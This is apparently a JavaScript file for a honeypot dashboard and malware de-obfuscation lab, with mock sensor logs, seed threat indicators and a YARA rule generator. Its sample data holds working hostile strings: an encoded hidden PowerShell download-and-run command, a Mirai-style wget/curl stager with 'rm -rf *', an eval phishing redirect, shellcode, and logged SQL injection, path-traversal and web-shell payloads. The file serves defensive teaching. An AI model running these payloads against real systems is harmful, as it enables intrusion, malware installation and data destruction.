/* ==========================================================================
   CYBER-GUARD // AUTONOMOUS HONEYPOT GRID & PAYLOAD FORENSICS LAB ENGINE
   Engineered for Hafiz Abdul Moiz & Muzmmial Ahmed CyberGuard SOC Portal
   ========================================================================== */

// AAPKE SCREENSHOT WALA EXACT FIREBASE REALTIME DATABASE URL:
const HP_FIREBASE_URL = "https://cyber-guard-live-feedback-default-rtdb.firebaseio.com/honeypot_leaks.json";
const HP_OWNER_WHATSAPP = "923262116352";

// Initial Verified Regional Indicators of Compromise (IoC) Leaks
const HP_SEED_LEAKS = [
    {
        id: "ioc-seed-1",
        type: "MALICIOUS IP",
        value: "185.220.101.5",
        target: "EasyPaisa / JazzCash Reverse Proxy",
        notes: "Hosting fake SMS verification portal redirecting to cred-stealer.",
        timestamp: Date.now() - 3600000,
        confirmedCount: 38,
        mitigated: false
    },
    {
        id: "ioc-seed-2",
        type: "SCAM SENDER ID",
        value: "EASY-PAY (Masked)",
        target: "Retail Mobile Wallets",
        notes: "Sending Rs. 25,000 accidental credit SMS lures requesting immediate refund.",
        timestamp: Date.now() - 7200000,
        confirmedCount: 54,
        mitigated: true
    },
    {
        id: "ioc-seed-3",
        type: "MALWARE SHA-256",
        value: "8f14e45fceea167a5a36dedd4bea2543b59f7df825b42d17464160a3ddb4ee2e",
        target: "BISP Relief Scheme APK",
        notes: "Android banking trojan requesting SMS permissions to intercept OTPs.",
        timestamp: Date.now() - 12000000,
        confirmedCount: 62,
        mitigated: false
    }
];

// Pre-Loaded Malware Samples for De-obfuscation Lab
const HP_MALWARE_SAMPLES = {
    powershell: {
        title: "Cobalt Strike PowerShell Dropper",
        raw: "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABzACAAPQAgACQAQwBsAGkAZQBuAHQALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQA6ADgAMAA4ADAvAGIAZQBhAGMAbwBuAC4AcABzADEAJwApADsASQBFAFgAIAAoACQAcwApAA==",
        mitre: "T1059.001 (Command and Scripting: PowerShell)",
        type: "Base64 Encoded PowerShell"
    },
    mirai: {
        title: "Mirai Botnet Telnet Stager",
        raw: "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; rm -rf *; wget http://185.220.101.5/bins/mirai.arm7; curl -O http://185.220.101.5/bins/mirai.arm7; chmod 777 mirai.arm7; ./mirai.arm7 telecom_probe",
        mitre: "T1105 (Ingress Tool Transfer)",
        type: "Linux Bash Dropper"
    },
    phish_eval: {
        title: "EasyPaisa Phish Script (JS Obfuscated)",
        raw: "eval(unescape('%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%65%61%73%79%70%61%69%73%61%2D%63%61%73%68%62%6F%6E%75%73%2E%78%79%7A%2F%6C%6F%67%69%6E%2E%70%68%70%3F%61%63%63%6F%75%6E%74%3D%30%33%32%31%27'))",
        mitre: "T1027 (Obfuscated/Encoded Files)",
        type: "URI Encoded Eval"
    },
    xor_shellcode: {
        title: "XOR-Packed Shellcode Payload",
        raw: "\\x33\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80 (XOR Key: 0x5A)",
        mitre: "T1027.002 (Software Packing)",
        type: "XOR Byte Stream"
    }
};

// 4 Honeypot Sensors
const HP_HONEYPOT_SENSORS = {
    cowrie: {
        name: "Cowrie SSH / Telnet Decoy",
        port: "Port 22 & 23 (Open)",
        target: "Linux Terminal / Brute-force Collector",
        logs: [
            "[12:14:02] SSH Connection from 185.220.101.5:41203 -> Handshake OK",
            "[12:14:03] AUTH FAILURE: user 'root' password 'admin123'",
            "[12:14:04] AUTH FAILURE: user 'admin' password 'P@ssw0rd2026'",
            "[12:14:06] AUTH SUCCESS: user 'support' password 'support' (Honeypot Session Opened)",
            "[12:14:07] COMMAND CAPTURED: uname -a; cat /proc/cpuinfo",
            "[12:14:08] COMMAND CAPTURED: wget http://194.26.29.110/shell.sh -O /tmp/x; sh /tmp/x",
            "[12:14:09] 🚨 ALERT: Automated Dropper Execution Intercepted & Sandboxed!"
        ]
    },
    conpot: {
        name: "Conpot Industrial SCADA Decoy",
        port: "Port 502 (Modbus) & 102 (Siemens S7)",
        target: "Pakistani Energy Feeder / Substation PLC",
        logs: [
            "[12:08:11] Modbus TCP Connection from 103.21.244.18:50201",
            "[12:08:12] Modbus Function Code: 0x01 (Read Coils) -> Feeder-04 Register 0x00A0",
            "[12:08:14] Modbus Function Code: 0x05 (Write Single Coil) -> Attempting Breaker Trip",
            "[12:08:15] 🚨 SCADA ANOMALY: Unauthorized Remote Feeder Disconnect Command Neutralized!",
            "[12:08:16] Attacker fingerprint logged to APT-36 Recon Dossier."
        ]
    },
    dionaea: {
        name: "Dionaea Malware Binary Collector",
        port: "Port 445 (SMB) & 3389 (RDP)",
        target: "Windows Server Exploit Collector",
        logs: [
            "[11:55:01] SMB Connection from 45.142.214.8:49210",
            "[11:55:02] SMBv1 Protocol Negotiation -> MS17-010 (EternalBlue) exploit probe",
            "[11:55:04] Binary Payload Transferred (Size: 48,120 bytes)",
            "[11:55:05] Payload MD5: d41d8cd98f00b204e9800998ecf8427e",
            "[11:55:06] Sandbox Verdict: Ransomware Dropper targeting Volume Shadow Copies."
        ]
    },
    glastopf: {
        name: "Glastopf Web Vulnerability Decoy",
        port: "Port 80 & 443 (HTTP/HTTPS)",
        target: "Web Application SQLi / LFI Honeypot",
        logs: [
            "[11:42:10] HTTP GET /login.php?user=' UNION SELECT null,password,username FROM users--",
            "[11:42:11] HTTP GET /index.php?page=../../../../etc/passwd",
            "[11:42:13] HTTP POST /upload.php -> Malicious shell 'c99.php.jpg' uploaded",
            "[11:42:14] 🚨 WEB ATTACK CAPTURED: Payload quarantined in isolated chroot."
        ]
    }
};

let currentSensor = "cowrie";
let hpLeakList = [];
let isVoiceEnabled = true;
let isAudioFxEnabled = true;
let canvasAnimationId = null;
let radarBlips = [];
let radarAngle = 0;

// Audio & Speech Synthesizer
let audioCtx = null;
function getAudioCtx() {
    if (!audioCtx) {
        const AudioClass = window.AudioContext || window.webkitAudioContext;
        if (AudioClass) audioCtx = new AudioClass();
    }
    if (audioCtx && audioCtx.state === "suspended") audioCtx.resume();
    return audioCtx;
}

function playCyberChirp(frequency = 880, duration = 0.1) {
    if (!isAudioFxEnabled) return;
    try {
        const ctx = getAudioCtx();
        if (!ctx) return;
        const now = ctx.currentTime;
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = "sine";
        osc.frequency.setValueAtTime(frequency, now);
        osc.frequency.exponentialRampToValueAtTime(frequency * 1.5, now + duration);
        gain.gain.setValueAtTime(0.08, now);
        gain.gain.exponentialRampToValueAtTime(0.001, now + duration);
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start(now);
        osc.stop(now + duration);
    } catch {}
}

function speakTacticalVoice(text) {
    if (!isVoiceEnabled || !window.speechSynthesis) return;
    try {
        window.speechSynthesis.cancel();
        const utterance = new SpeechSynthesisUtterance(text);
        utterance.rate = 1.05;
        utterance.pitch = 0.95;
        utterance.volume = 0.9;
        window.speechSynthesis.speak(utterance);
    } catch {}
}

function toggleTacticalVoice() {
    isVoiceEnabled = !isVoiceEnabled;
    const btn = document.getElementById("hpVoiceBtn");
    if (btn) {
        btn.classList.toggle("active", isVoiceEnabled);
        btn.innerHTML = isVoiceEnabled ? "🗣️ AI Voice Alerts: ON" : "🔇 AI Voice Alerts: MUTED";
    }
    if (isVoiceEnabled) speakTacticalVoice("Tactical AI voice synthesis active.");
}

function toggleAudioFx() {
    isAudioFxEnabled = !isAudioFxEnabled;
    const btn = document.getElementById("hpAudioFxBtn");
    if (btn) {
        btn.classList.toggle("active", isAudioFxEnabled);
        btn.innerHTML = isAudioFxEnabled ? "🔊 Sound FX: ON" : "🔇 Sound FX: OFF";
    }
}

// HTML5 Canvas Radar Animation
function initCanvasRadar() {
    const canvas = document.getElementById("honeypotCanvas");
    if (!canvas) return;
    const ctx = canvas.getContext("2d");

    function resizeCanvas() {
        const rect = canvas.parentElement.getBoundingClientRect();
        canvas.width = rect.width;
        canvas.height = rect.height;
    }
    resizeCanvas();
    window.addEventListener("resize", resizeCanvas);

    radarBlips = [
        { x: 0.35, y: 0.3, type: "attacker", color: "#ff0055", label: "185.220.101.5 (SSH Scan)", port: 22 },
        { x: 0.65, y: 0.45, type: "attacker", color: "#ffaa00", label: "103.21.244.18 (Modbus PLC)", port: 502 },
        { x: 0.45, y: 0.75, type: "attacker", color: "#00f0ff", label: "45.142.214.8 (SMB Probe)", port: 445 },
        { x: 0.5, y: 0.5, type: "decoy", color: "#00ffaa", label: "PK-CORE-DECOY-01", port: "ALL" },
        { x: 0.75, y: 0.25, type: "decoy", color: "#00ffaa", label: "KARACHI-HONEYPOT-02", port: 80 }
    ];

    function drawRadar() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        const cx = canvas.width / 2;
        const cy = canvas.height / 2;
        const radius = Math.min(cx, cy) - 20;

        ctx.strokeStyle = "rgba(0, 240, 255, 0.15)";
        ctx.lineWidth = 1;
        for (let r = 0.25; r <= 1; r += 0.25) {
            ctx.beginPath();
            ctx.arc(cx, cy, radius * r, 0, Math.PI * 2);
            ctx.stroke();
        }

        ctx.beginPath();
        ctx.moveTo(cx - radius, cy);
        ctx.lineTo(cx + radius, cy);
        ctx.moveTo(cx, cy - radius);
        ctx.lineTo(cx, cy + radius);
        ctx.stroke();

        radarAngle += 0.025;
        const sweepGradient = ctx.createRadialGradient(cx, cy, 0, cx, cy, radius);
        sweepGradient.addColorStop(0, "rgba(0, 240, 255, 0.25)");
        sweepGradient.addColorStop(1, "rgba(0, 240, 255, 0)");

        ctx.beginPath();
        ctx.moveTo(cx, cy);
        ctx.arc(cx, cy, radius, radarAngle - 0.4, radarAngle);
        ctx.closePath();
        ctx.fillStyle = sweepGradient;
        ctx.fill();

        radarBlips.forEach(blip => {
            const bx = canvas.width * blip.x;
            const by = canvas.height * blip.y;

            ctx.beginPath();
            ctx.arc(bx, by, blip.type === "decoy" ? 6 : 5, 0, Math.PI * 2);
            ctx.fillStyle = blip.color;
            ctx.shadowColor = blip.color;
            ctx.shadowBlur = 10;
            ctx.fill();
            ctx.shadowBlur = 0;

            ctx.font = "9px 'Fira Code', monospace";
            ctx.fillStyle = "#cbd5e1";
            ctx.fillText(blip.label, bx + 8, by + 3);
        });

        canvasAnimationId = requestAnimationFrame(drawRadar);
    }

    drawRadar();

    canvas.addEventListener("click", (e) => {
        const rect = canvas.getBoundingClientRect();
        const mx = e.clientX - rect.left;
        const my = e.clientY - rect.top;

        radarBlips.forEach(blip => {
            const bx = canvas.width * blip.x;
            const by = canvas.height * blip.y;
            const dist = Math.hypot(mx - bx, my - by);

            if (dist < 18) {
                playCyberChirp(1200, 0.15);
                speakTacticalVoice(`Inspecting intercept node: ${blip.label}`);
                const statsEl = document.getElementById("canvasStatsOverlay");
                if (statsEl) {
                    statsEl.innerHTML = `TARGET ISOLATED: ${blip.label} // PORT ${blip.port} [ACTIVE TRAFFIC]`;
                }
            }
        });
    });
}

function deployDecoyTrap() {
    playCyberChirp(700, 0.2);
    const newDecoy = {
        x: 0.2 + Math.random() * 0.6,
        y: 0.2 + Math.random() * 0.6,
        type: "decoy",
        color: "#00ffaa",
        label: `DECOY-NODE-${Math.floor(10 + Math.random() * 90)}`,
        port: 22
    };
    radarBlips.push(newDecoy);
    speakTacticalVoice(`Autonomous honeypot decoy deployed to sector ${newDecoy.label}`);
    const statsEl = document.getElementById("canvasStatsOverlay");
    if (statsEl) {
        statsEl.innerHTML = `SENSOR DEPLOYED: ${newDecoy.label} ONLINE`;
    }
}

// Honeypot Sensor Switching
function switchHoneypotSensor(sensorKey) {
    currentSensor = sensorKey;
    playCyberChirp(950, 0.08);

    document.querySelectorAll(".hp-tab-btn").forEach(btn => {
        btn.classList.toggle("active", btn.getAttribute("data-sensor") === sensorKey);
    });

    const sensor = HP_HONEYPOT_SENSORS[sensorKey];
    if (!sensor) return;

    const nameEl = document.getElementById("hpDecoyName");
    const portEl = document.getElementById("hpDecoyPort");
    const logStream = document.getElementById("hpLogStream");

    if (nameEl) nameEl.textContent = sensor.name;
    if (portEl) portEl.textContent = `${sensor.port} // ${sensor.target}`;

    if (logStream) {
        logStream.innerHTML = sensor.logs.map(log => {
            const isRed = log.includes("ALERT") || log.includes("ANOMALY") || log.includes("FAILURE");
            return `<div class="hp-log-entry ${isRed ? 'flag-red' : ''}">${escapeHpHtml(log)}</div>`;
        }).join("");
    }
}

function isolateCurrentAttacker() {
    playCyberChirp(440, 0.3);
    speakTacticalVoice("Attacker IP severed. Firewall drop rule propagated across all sensors.");
    const logStream = document.getElementById("hpLogStream");
    if (logStream) {
        const timeStr = new Date().toLocaleTimeString();
        logStream.innerHTML += `
            <div class="hp-log-entry flag-red">
                [${timeStr}] ⚡ ISOLATION EXECUTED: iptables -A INPUT -s ATTACKER_IP -j DROP applied!
            </div>
        `;
        logStream.scrollTop = logStream.scrollHeight;
    }
}

// Payload Forensics & De-obfuscation
function selectMalwareSample(sampleKey) {
    playCyberChirp(800, 0.08);
    const sample = HP_MALWARE_SAMPLES[sampleKey];
    if (!sample) return;

    document.querySelectorAll(".hp-sample-chip").forEach(chip => {
        chip.classList.toggle("active", chip.getAttribute("data-sample") === sampleKey);
    });

    const input = document.getElementById("hpPayloadInput");
    if (input) input.value = sample.raw;

    const mitreEl = document.getElementById("hpMitreTtp");
    if (mitreEl) mitreEl.textContent = sample.mitre;
}

function calculateEntropy(str) {
    if (!str || str.length === 0) return 0;
    const len = str.length;
    const frequencies = {};
    for (let i = 0; i < len; i++) {
        const char = str[i];
        frequencies[char] = (frequencies[char] || 0) + 1;
    }

    let entropy = 0;
    for (const char in frequencies) {
        const p = frequencies[char] / len;
        entropy -= p * Math.log2(p);
    }
    return parseFloat(entropy.toFixed(3));
}

function runPayloadDeobfuscation() {
    const input = document.getElementById("hpPayloadInput")?.value || "";
    const outputBox = document.getElementById("hpOutputBox");
    const entropyValEl = document.getElementById("hpEntropyVal");
    const entropyFill = document.getElementById("hpEntropyFill");
    const deobfuscateSpeedEl = document.getElementById("hpSpeedVal");
    const iocCountEl = document.getElementById("hpIocCount");

    if (!input.trim()) return;

    playCyberChirp(1100, 0.15);
    const startTime = performance.now();

    const entropy = calculateEntropy(input);
    if (entropyValEl) entropyValEl.textContent = `${entropy} bits/byte`;
    if (entropyFill) {
        const pct = Math.min(100, (entropy / 8.0) * 100);
        entropyFill.style.width = pct + "%";
        entropyFill.style.backgroundColor = entropy > 6.0 ? "#ff0055" : (entropy > 4.5 ? "#ffaa00" : "#00ffaa");
    }

    let result = "";
    let extractedIocs = [];

    if (input.includes("-Enc ") || input.includes("-EncodedCommand ")) {
        const match = input.match(/-Enc\s+([A-Za-z0-9+/=]+)/i) || input.match(/-EncodedCommand\s+([A-Za-z0-9+/=]+)/i);
        if (match && match[1]) {
            try {
                const b64 = match[1];
                const rawBinary = atob(b64);
                let decodedStr = "";
                for (let i = 0; i < rawBinary.length; i += 2) {
                    decodedStr += rawBinary[i];
                }
                result = `[STAGE 1: POWERSHELL UTF-16LE DECODED]\n${decodedStr}\n\n`;
            } catch {
                result = "[ERROR: Invalid Base64 String]\n";
            }
        }
    }

    if (input.includes("%") || input.includes("unescape")) {
        try {
            const uriClean = input.replace(/eval\(unescape\('([^']+)'\)\)/i, "$1");
            const unescaped = decodeURIComponent(uriClean);
            result += `[STAGE 2: URL UNESCAPED STRING]\n${unescaped}\n\n`;
        } catch {}
    }

    if (input.includes("wget ") || input.includes("curl ")) {
        result += `[STAGE 3: BASH STAGER COMMANDS DETECTED]\nExtracted Remote Staging Chain: Download & Chmod 777 Execution\n\n`;
    }

    const ipMatches = input.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || [];
    const urlMatches = input.match(/https?:\/\/[^\s'")]+/g) || [];

    ipMatches.forEach(ip => extractedIocs.push(`IP: ${ip}`));
    urlMatches.forEach(u => extractedIocs.push(`URL: ${u}`));

    const endTime = performance.now();
    if (deobfuscateSpeedEl) deobfuscateSpeedEl.textContent = `${(endTime - startTime).toFixed(1)} ms`;
    if (iocCountEl) iocCountEl.textContent = `${extractedIocs.length} IoCs Found`;

    result += `[STAGE 4: EXTRACTED INDICATORS OF COMPROMISE]\n` + (extractedIocs.length ? extractedIocs.join("\n") : "No public IPs directly detected in string.") + "\n\n";
    result += `[VERDICT: MALICIOUS THREAT SIGNATURE DETECTED]`;

    if (outputBox) outputBox.textContent = result;
    speakTacticalVoice(`De-obfuscation complete. Extracted ${extractedIocs.length} Indicators of Compromise. Entropy ${entropy}.`);
}

function openYaraRuleModal() {
    playCyberChirp(600, 0.15);
    const modal = document.getElementById("hpYaraModal");
    const codeEl = document.getElementById("hpYaraCode");
    if (!modal || !codeEl) return;

    const ruleCode = `rule CyberGuard_Honeypot_Payload_Intercept {
    meta:
        description = "Automated YARA rule generated by Hafiz Abdul Moiz & Muzmmial Ahmed SOC Engine"
        author = "CyberGuard SOC v5.0"
        date = "${new Date().toISOString().split('T')[0]}"
        severity = "CRITICAL"
        threat_level = "High"

    strings:
        $s1 = "powershell" ascii nocase
        $s2 = "wget" ascii nocase
        $s3 = "chmod 777" ascii nocase
        $s4 = "185.220.101.5" ascii
        $s5 = "eval" ascii nocase

    condition:
        2 of ($s*)
}`;

    codeEl.textContent = ruleCode;
    modal.style.display = "flex";
}

function closeYaraModal() {
    const modal = document.getElementById("hpYaraModal");
    if (modal) modal.style.display = "none";
}

function copyYaraRule() {
    const codeEl = document.getElementById("hpYaraCode");
    if (!codeEl) return;
    navigator.clipboard.writeText(codeEl.textContent).then(() => {
        alert("✅ YARA Rule copied to clipboard!");
    });
}

// Live Firebase Realtime DB Sync
async function fetchHoneypotLeaks() {
    try {
        const res = await fetch(HP_FIREBASE_URL, { cache: "no-store" });
        if (res.ok) {
            const data = await res.json();
            if (data && typeof data === "object") {
                const remote = Object.keys(data).map(key => ({ id: key, ...data[key] }));
                const map = new Map();
                HP_SEED_LEAKS.forEach(s => map.set(s.id, s));
                remote.forEach(r => map.set(r.id, r));
                hpLeakList = Array.from(map.values()).sort((a, b) => b.timestamp - a.timestamp);
                renderHoneypotLeaks();
                return;
            }
        }
    } catch {
        // Graceful fallback to the seeded threat vault when Firebase is unavailable.
    }

    if (hpLeakList.length === 0) hpLeakList = [...HP_SEED_LEAKS];
    renderHoneypotLeaks();
}

function renderHoneypotLeaks() {
    const grid = document.getElementById("hpLeakCardsGrid");
    if (!grid) return;

    grid.innerHTML = hpLeakList.map(leak => {
        const timeAgo = formatHpTime(leak.timestamp);
        const waText = encodeURIComponent(
            `🚨 *CYBERGUARD IoC THREAT ALERT*\n\n` +
            `⚠️ *Type:* ${leak.type}\n` +
            `🎯 *Threat Value:* ${leak.value}\n` +
            `🏢 *Targeted Sector:* ${leak.target}\n` +
            `📝 *Forensic Note:* ${leak.notes}\n\n` +
            `🛡️ *Confirmed by Community:* ${leak.confirmedCount} times\n` +
            `🌐 *Status:* Active on Firebase Realtime DB`
        );

        return `
            <div class="hp-leak-item">
                <div>
                    <div class="hp-leak-top">
                        <span class="hp-ioc-type">${escapeHpHtml(leak.type)}</span>
                        <span class="hp-leak-time">${timeAgo}</span>
                    </div>
                    <div class="hp-leak-val">${escapeHpHtml(leak.value)}</div>
                    <div class="hp-leak-meta">
                        <strong>Target:</strong> ${escapeHpHtml(leak.target)}<br>
                        <strong>Forensic Note:</strong> ${escapeHpHtml(leak.notes)}
                    </div>
                </div>
                <div class="hp-leak-actions">
                    <button type="button" class="btn-confirm-threat" onclick="confirmThreatLeak('${leak.id}')">
                        👍 Confirm Threat (${leak.confirmedCount || 0})
                    </button>
                    <a href="https://wa.me/${HP_OWNER_WHATSAPP}?text=${waText}" target="_blank" class="btn-wa-alert">
                        📲 Forward WA
                    </a>
                </div>
            </div>
        `;
    }).join("");
}

async function handleIocSubmit(e) {
    e.preventDefault();
    const typeSelect = document.getElementById("hpIocType");
    const valInput = document.getElementById("hpIocVal");
    const targetInput = document.getElementById("hpIocTarget");
    const notesInput = document.getElementById("hpIocNotes");

    if (!valInput.value.trim() || !notesInput.value.trim()) return;

    const newLeak = {
        type: typeSelect.value || "MALICIOUS IP",
        value: valInput.value.trim(),
        target: targetInput.value.trim() || "Banking / Mobile Wallets",
        notes: notesInput.value.trim(),
        timestamp: Date.now(),
        confirmedCount: 1,
        mitigated: false
    };

    playCyberChirp(550, 0.2);

    try {
        const res = await fetch(HP_FIREBASE_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(newLeak)
        });
        if (res.ok) {
            const data = await res.json();
            newLeak.id = data.name || "ioc_" + Date.now();
        } else {
            newLeak.id = "ioc_" + Date.now();
        }
    } catch {
        newLeak.id = "ioc_" + Date.now();
    }

    hpLeakList.unshift(newLeak);
    renderHoneypotLeaks();

    valInput.value = "";
    targetInput.value = "";
    notesInput.value = "";

    speakTacticalVoice("New Indicator of Compromise broadcasted to Firebase Realtime Database.");

    const waText = encodeURIComponent(
        `🚨 *NEW IoC SUBMISSION DISPATCH*\n\n` +
        `⚠️ *Type:* ${newLeak.type}\n` +
        `🎯 *Value:* ${newLeak.value}\n` +
        `🏢 *Target:* ${newLeak.target}\n` +
        `📝 *Note:* ${newLeak.notes}\n\n` +
        `🛡️ Dispatched to Hafiz Abdul Moiz & Muzmmial Ahmed SOC Portal.`
    );
    window.open(`https://wa.me/${HP_OWNER_WHATSAPP}?text=${waText}`, "_blank");
}

async function confirmThreatLeak(id) {
    const item = hpLeakList.find(i => i.id === id);
    if (!item) return;

    item.confirmedCount = (item.confirmedCount || 0) + 1;
    playCyberChirp(850, 0.08);
    renderHoneypotLeaks();

    try {
        await fetch(`https://cyber-guard-live-feedback-default-rtdb.firebaseio.com/honeypot_leaks/${id}/confirmedCount.json`, {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(item.confirmedCount)
        });
    } catch {}
}

function formatHpTime(timestamp) {
    if (!timestamp) return "Live";
    const mins = Math.floor((Date.now() - timestamp) / 60000);
    if (mins < 1) return "Just Now";
    if (mins < 60) return `${mins}m ago`;
    const hrs = Math.floor(mins / 60);
    return `${hrs}h ago`;
}

function escapeHpHtml(str) {
    return String(str || "").replace(/[&<>'"]/g, c => ({
        "&": "&amp;", "<": "&lt;", ">": "&gt;", "'": "&#39;", '"': "&quot;"
    }[c]));
}

// Auto Initialize
document.addEventListener("DOMContentLoaded", () => {
    initCanvasRadar();
    switchHoneypotSensor("cowrie");
    selectMalwareSample("powershell");
    fetchHoneypotLeaks();
    setInterval(fetchHoneypotLeaks, 12000);
});